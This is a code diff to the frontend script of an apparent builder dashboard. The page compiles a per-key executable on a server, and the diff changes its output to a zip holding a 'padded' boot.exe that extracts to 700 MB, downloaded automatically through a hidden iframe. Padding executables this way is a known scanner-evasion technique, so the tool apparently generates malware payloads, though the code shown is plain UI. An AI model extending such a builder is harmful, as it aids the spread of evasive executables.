@@ -1,5 +1,6 @@
 // language: JavaScript, file: public/js/builder.js
 // builder tab — key field, build button, auto-download on success, builds list.
+// deliverables are zips now (padded boot.exe inside), not raw exes.
 
 (function () {
   'use strict';
@@ -68,7 +69,7 @@
 
     btn.disabled = true;
     btn.textContent = 'building…';
-    out.innerHTML = '<div class="note">compiling on server — first build takes 2–3 min, after that ~30s</div>';
+    out.innerHTML = '<div class="note">compiling + padding + zipping — first build takes 2–3 min, after that ~30s</div>';
 
     try {
       const r = await fetch('/api/build', {
@@ -84,15 +85,17 @@
       } else {
         out.innerHTML = `
           <div class="tile">
-            <div class="k">build ready — download starting</div>
+            <div class="k">build ready — zip download starting</div>
             <div class="v mono" style="font-size:13px;margin-top:8px">${esc(d.key)}</div>
+            <div class="note" style="margin-top:8px">
+              ${humanSize(d.size)} zip · extracts to a 700 MB boot.exe
+            </div>
             <div style="display:flex;gap:8px;margin-top:14px;flex-wrap:wrap">
               <button class="ghost mini" id="b-dl-now">download again</button>
             </div>
-            <div class="note">live url: <code style="color:var(--accent);font-family:var(--mono)">/api/downloads/boot.exe</code></div>
+            <div class="note">live url: <code style="color:var(--accent);font-family:var(--mono)">/api/downloads/boot.zip</code></div>
           </div>`;
 
-        // auto-download via hidden iframe — no navigation away from the dashboard
         const iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = d.url;
